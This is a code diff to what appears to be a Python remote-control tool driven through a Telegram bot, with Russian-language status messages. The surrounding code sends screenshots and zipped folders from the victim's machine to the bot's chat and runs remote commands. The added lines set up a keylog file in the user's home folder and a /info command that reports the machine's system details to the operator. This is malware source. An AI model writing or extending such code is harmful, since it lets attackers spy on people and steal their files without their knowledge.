@@ -7,7 +7,31 @@ with open('screenshot.png', 'rb') as screenshot_file:
 bot.send_message(chat_id, message)
 os.remove('screenshot.png')
 
+user = os.environ.get("USERNAME")
+user_folder = os.path.expanduser('~')
+log_file = os.path.join(user_folder, 'keylogs.txt')
+with open(log_file, "a") as f:
+    f.write("-------------------------------------------------\n")
+    f.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
+initi = False
 
+@bot.message_handler(commands=['info'])
+def pc_info(message):
+    chat_id = message.chat.id
+    bot.send_chat_action(chat_id, 'typing')
+    info = ''
+    for pc_info in platform.uname():
+        info += '\n' + pc_info
+    bot.send_message(chat_id, info)
+    try:
+        error_message = f"ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except PermissionError as e:
+        error_message = f"ОШИБКА:: {e}"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
 user = os.path.expanduser("~")
 
 def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
@@ -234,7 +258,7 @@ def execute_code(message):
 @bot.message_handler(commands=['sms'])
 def msg_box(message):
     chat_id = message.chat.id
-    message_text = message.text.replace('sms ', '')
+    message_text = message.text.replace('/sms ', '')
     if message_text == '':
         bot.send_message(chat_id, 'НЕПРАВИЛЬНО НУЖНО ТАК: /sms твой текст')
     else:
